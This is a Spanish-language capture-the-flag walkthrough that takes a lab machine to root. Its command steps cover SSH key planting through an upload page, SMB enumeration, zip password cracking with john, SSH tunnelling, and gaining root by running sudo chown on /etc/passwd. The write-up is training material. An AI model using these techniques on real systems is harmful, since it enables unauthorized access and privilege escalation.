nmap: 80,22,139,445

![image](https://github.com/user-attachments/assets/c93e0c93-23ce-460d-b526-85e968e6f4ec)

---
en la pagina principal nos da:

![image](https://github.com/user-attachments/assets/fcc9059f-34dc-4407-a66f-0ffb9b1e35fe)

hacemos un gobuster:

![image](https://github.com/user-attachments/assets/3c562d69-2edd-486b-a1fd-1d4009b5bff6)

nos dio upload.php

![image](https://github.com/user-attachments/assets/4d4f493c-43c8-4824-b9c2-f362aa2990d4)

vuelvo hacer un gobuster pero agrego un .txt

![image](https://github.com/user-attachments/assets/3aab916e-3450-485c-8729-844555a092dd)

entramos y nos da

![image](https://github.com/user-attachments/assets/eabd553b-6926-48d4-ad8a-07d14d14bdf8)

Esto significa que si realmente se sube en ".ssh", podemos subir nuestro "id_rsa.pub" con el nombre "authorized_keys" y conectarnos sin necesidad de clave, nos faltaría usuarios 

pero podemos enumerar con: 
> enum4linux 172.18.0.2

nos da:

![image](https://github.com/user-attachments/assets/922a3b0b-ee7e-4809-bf6d-55356c4e5565)

creamos un id_rsa 

    ssh-keygen -t rsa -b 4096

![image](https://github.com/user-attachments/assets/3abfabf0-f121-40d6-987e-86224e2cba2f)

nos dara: id_rsa  id_rsa.pub  

pasamos la clave a un authorized_keys

![image](https://github.com/user-attachments/assets/8ab00440-e29b-4c45-b999-d7b5cb3914d4)

le damos permisos: 
> chmod 600 id_rsa 

subimos el authorized_keys

![image](https://github.com/user-attachments/assets/bdc38c49-08c0-4727-abc3-53421d68aab4)

ahora en el terminal colocamos: 
>  ssh passsamba@172.18.0.2 -i id_rsa

 estamos dentro

![image](https://github.com/user-attachments/assets/e3f79d3c-7b47-433b-b866-849bcbae20db)

al hacer un "ls", nos da esto:
>cat note.txt

![image](https://github.com/user-attachments/assets/02e6ce37-d644-425f-ba73-bd0b01b4a1a4)

por la similitud  con  un nombre de usuario, probamos como contraseña:
> su sambauser / sambaarribasiempre

y ahora somos sambauser

como no hay nada, encontré para ver posibles directorios:

    smbmap -u "sambauser" -p "sambaarribasiempre" -d workgroup -H 172.19.0.2

![image](https://github.com/user-attachments/assets/c56356f7-e265-4009-b2be-75228b56496c)

nos dio dos:
> read_only_share

nos conectamos como clientes.

    smbclient //172.18.0.2/read_only_share -U sambauser -W workgroup  

la contraseña es la misma y dentro nos pasamos con get el zip que hay

![image](https://github.com/user-attachments/assets/4078231a-b32e-45f9-a536-865b0c8d77e4)

como pide contraseña la sacamos:

    zip2john secret.zip > hash.txt 
    john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
    
> contraseña: qwert

![image](https://github.com/user-attachments/assets/5d72b198-dbda-48ca-971d-6e71aa66eee1)

le colocamos al txt cat y nos da:
> root-false:cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ==

en la misma terminal colocamos:
> echo "cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ==" | base64 -d

nos da la contraseña

![image](https://github.com/user-attachments/assets/7e47d33d-2cf5-4fea-9411-068ca33b6998)

entramos por ssh en una terminal y colocamos la contraseña con el usuario "root-false"

dentro hay un: message.txt que dice:

![image](https://github.com/user-attachments/assets/4ee839aa-948b-44f5-8945-716001247013)

encontramos esto

![image](https://github.com/user-attachments/assets/be0d2017-31f6-44c3-852f-6563801c2187)

ejecutamos el comando

     curl -vvv -d 'username=mario&password=pinguinodemarioelmejor' http://10.10.11.5

lo que lanzamos es lo del mensaje que vimos 

![image](https://github.com/user-attachments/assets/8d68948b-03ab-4824-a5f2-abd41ec454d2)

lanzamos:

     curl -vvv http://10.10.11.5/super_secure_page/admin.php/

si se hace un: curl -v 10.10.11.5
nos mostrara código de una pagina que contiene un login en el puerto 80

hacemos este comando: 
> ssh root-false@172.18.0.2 -L 9090:10.10.11.5:80

y nos conectaremos otra vez

![image](https://github.com/user-attachments/assets/b1e035df-43e2-49aa-88be-55cc626b0589)

nos vamos a firefox y buscamos esto:
> http://127.0.0.1:9090/

no me funciono pero del codigo anterior vi un "ultramegatexto.txt", lanzamos el siguiente comando

    curl http://10.10.11.5/ultramegatextosecret.txt


nos dio:

![image](https://github.com/user-attachments/assets/a7017a56-9d42-45e6-9499-8175c6eb12bb)

nos dará la pagina de login - admin
en el texto hay parte que me llamo la atención que parece contraseña que dice:
> Cristal_de_la_Aurora

la probamos en el usuario less que sale al final del texto.
y somos el usuario less 
al hacer sudo -l nos da: chown

![image](https://github.com/user-attachments/assets/2b437a35-affa-4ce9-bade-af9ad044a4a6)

buscando encontré que podemos cambiar al propietario de la carpeta /etc/passwd
con este comando: 

    sudo chown less:less /etc/passwd

ahora hacemos un:

    nano /etc/passwd

![image](https://github.com/user-attachments/assets/12c3764b-78f6-46de-87d3-39442c87aa15)

le quitamos la "x" a root 
guardamos y ejecutamos

![image](https://github.com/user-attachments/assets/d34b87dc-97eb-4bfc-b7c0-bb68dfc2b95b)

su root
somos root! 
